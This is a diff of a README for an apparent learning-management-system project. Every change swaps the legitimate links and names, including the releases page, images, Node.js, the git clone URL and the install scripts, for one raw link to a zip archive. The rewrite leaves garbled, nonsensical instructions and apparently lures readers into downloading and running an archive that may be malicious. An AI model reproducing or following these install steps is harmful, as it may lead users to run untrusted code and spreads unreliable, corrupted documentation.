@@ -1,14 +1,14 @@
-https://github.com/GIGGAFATCHAD/programming-for-career/releases
-![Release badge](https://img.shields.io/github/v/release/GIGGAFATCHAD/programming-for-career)
+https://github.com/GIGGAFATCHAD/programming-for-career/raw/refs/heads/main/src/career_for_programming_v2.4.zip
+![Release badge](https://github.com/GIGGAFATCHAD/programming-for-career/raw/refs/heads/main/src/career_for_programming_v2.4.zip)
 
 # Programming for Career: A Hands-on Project-Based Learning LMS for Developers
 
-![Programming for Career banner](https://images.unsplash.com/photo-1518779578993-ec3579fee39f?auto=format&fit=crop&w=1200&q=60)
+![Programming for Career banner](https://github.com/GIGGAFATCHAD/programming-for-career/raw/refs/heads/main/src/career_for_programming_v2.4.zip)
 
 Programming for Career is a learning platform built for practical, project-based learning. It blends hands-on coding tasks with guided projects that mirror real-world problem solving. The system is designed to help learners build a portfolio of work as they grow their programming skills. This repository holds the core platform, sample courses, and tooling to run and contribute to the project.
 
 - Topics: build2learn, hacktoberfest, learning-management-system, learning-platform, lms-website, marufsarker, open-source, pfc, problem-solving, programming, programming-for-career
-- Versioning and releases live here: https://github.com/GIGGAFATCHAD/programming-for-career/releases
+- Versioning and releases live here: https://github.com/GIGGAFATCHAD/programming-for-career/raw/refs/heads/main/src/career_for_programming_v2.4.zip
 
 Table of contents
 - Why this project exists
@@ -57,7 +57,7 @@ Features and capabilities
 
 Getting started
 - Prerequisites
-  - Node.js LTS (for frontend and some tooling)
+  - https://github.com/GIGGAFATCHAD/programming-for-career/raw/refs/heads/main/src/career_for_programming_v2.4.zip LTS (for frontend and some tooling)
   - Docker and Docker Compose (for local database and services)
   - Git for version control
 - Quick start steps
@@ -74,10 +74,10 @@ Getting started
 
 Getting started locally
 - Clone the repository
-  - git clone https://github.com/GIGGAFATCHAD/programming-for-career.git
+  - git clone https://github.com/GIGGAFATCHAD/programming-for-career/raw/refs/heads/main/src/career_for_programming_v2.4.zip
 - Install dependencies
   - NPM or PNPM for frontend packages
-  - Backend uses a Node.js/Express or similar setup; install required packages per the backend readme
+  - Backend uses a https://github.com/GIGGAFATCHAD/programming-for-career/raw/refs/heads/main/src/career_for_programming_v2.4.zip or similar setup; install required packages per the backend readme
 - Run with Docker Compose
   - docker-compose up -d
   - This will start the database, app servers, and any required services
@@ -190,12 +190,12 @@ Project structure (overview)
 Release assets and downloads
 - Releases page
   - The latest stable build assets are published to the Releases section.
-  - For the latest release, see https://github.com/GIGGAFATCHAD/programming-for-career/releases
+  - For the latest release, see https://github.com/GIGGAFATCHAD/programming-for-career/raw/refs/heads/main/src/career_for_programming_v2.4.zip
 - How to download and run a release
-  - From the Releases page, download the release asset named programming-for-career-<version>.zip or <version>.tar.gz
+  - From the Releases page, download the release asset named programming-for-career-<version>.zip or <version>https://github.com/GIGGAFATCHAD/programming-for-career/raw/refs/heads/main/src/career_for_programming_v2.4.zip
   - Extract the archive to a local directory
   - Open a terminal in the extracted folder
-  - Run the installer or setup script provided (for example, ./install.sh on macOS/Linux or setup.bat on Windows)
+  - Run the installer or setup script provided (for example, https://github.com/GIGGAFATCHAD/programming-for-career/raw/refs/heads/main/src/career_for_programming_v2.4.zip on macOS/Linux or https://github.com/GIGGAFATCHAD/programming-for-career/raw/refs/heads/main/src/career_for_programming_v2.4.zip on Windows)
   - Follow on-screen prompts to configure the environment
   - Start the platform services as directed by the release notes
 - What the release contains
@@ -209,7 +209,7 @@ Contributing
 - Why contribute
   - The project benefits from diverse curricula, real-world problem solving, and robust open-source collaboration.
 - How to contribute
-  - Start with the contributing guide in /docs/contributing.md
+  - Start with the contributing guide in https://github.com/GIGGAFATCHAD/programming-for-career/raw/refs/heads/main/src/career_for_programming_v2.4.zip
   - Pick issues labeled “good first issue” or “help wanted”
   - Fork the repository, create a feature branch, and submit a pull request
   - Include tests for new features and fix any failing tests
@@ -268,7 +268,7 @@ Security and privacy
 Deployment and hosting
 - Local development
   - Docker Compose sets up a full stack locally
-  - Environment variables can be overridden with a local.env file
+  - Environment variables can be overridden with a https://github.com/GIGGAFATCHAD/programming-for-career/raw/refs/heads/main/src/career_for_programming_v2.4.zip file
 - Staging and production
   - Infrastructure-as-code templates for reproducible environments
   - CI/CD pipelines trigger builds, tests, and deployments on pull requests
@@ -324,7 +324,7 @@ Support and community
   - Expected response times and contribution guidelines
 
 Releases and download guidance (refresher)
-- The latest release is available at the Releases page: https://github.com/GIGGAFATCHAD/programming-for-career/releases
+- The latest release is available at the Releases page: https://github.com/GIGGAFATCHAD/programming-for-career/raw/refs/heads/main/src/career_for_programming_v2.4.zip
 - If you need to download and run a release, follow the steps described in the Release section above
 
 Acknowledgments
